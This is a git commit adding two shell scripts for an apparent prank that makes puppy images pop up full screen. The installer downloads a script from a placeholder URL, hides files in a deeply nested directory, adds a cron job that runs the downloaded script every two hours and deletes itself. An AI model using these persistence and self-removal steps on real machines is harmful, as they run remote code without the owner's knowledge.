833566ff018d4121971d4b89d10a3fc8ae42757b
Sasha Bayan <SashaBayan@gmail.com>
2015-04-13 16:07:12 -0700

    adds script and zip files with instructions

---
+++ puppies.sh
@@ -0,0 +1,31 @@
+#create a deeply nested directory 
+mkdir -p ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here;
+
+#get zip file from url and store it in the director you just created
+curl -L **URL** > ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/puppies.zip
+
+#download the loop script that will run the files that open the puppy images
+curl -L **URL** > ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/loop.sh
+
+#unzip the file and save the uncompressed version in the same directory
+unzip -o ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/puppies.zip -d ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/
+
+#copies the current set of cron jobs and writes them to a temporary file
+#NOTE: we do "crontab -l > fileName" instead of creating an entirely new file 
+#      in order to preserve whatever cron jobs already exist on that users computer.
+#      Echoing text into the crontab will overwrite any existing cron jobs, which is why
+#      we don't simply create a new file via the "touch" command and then echo it into the crontab.
+crontab -l > here_be_puppies;
+
+#copy the cron job to the temporary file
+#NOTE: the cronjob is currently set to run the script every two hours
+echo "* */2 * * * sh ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/loop.sh" >> here_be_puppies;
+
+#install new cron job in the crontab
+crontab here_be_puppies;
+
+#delete the temporary file used to store the cron job text
+rm here_be_puppies;
+
+#the file removes itself
+rm -- "$0";
---
+++ who_let_the_dogs_out.sh
@@ -0,0 +1,23 @@
+#Go through the number of puppy pic files and open them up individually
+
+#The range in {} can be modified to accomodate however many images the zip file contains
+
+#NOTE: currently, in order for the files to be opened by this script, they must
+#      1) Have a title of a number 
+#          WORKS: 0.jpg
+#          DOESN'T WORK: puppy.jpg
+#      2) Have an extension of .jpg
+
+#This limitation can be fixed by changing the for loop to look for a specifig Regular Expression
+#I may implement this feature in the future
+
+for i in {1..18}
+do
+  #open the image file
+   open -a ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/$i.jpg; 
+   #stop for .3 seconds 
+   sleep .3;
+   #full screen the picture after it has been opened
+   /usr/bin/osascript -e 'tell application "Preview"' -e "activate" -e 'tell application "System Events"' -e 'keystroke "f" using {control down, command down}' -e "end tell" -e "end tell";
+   sleep .3;
+done
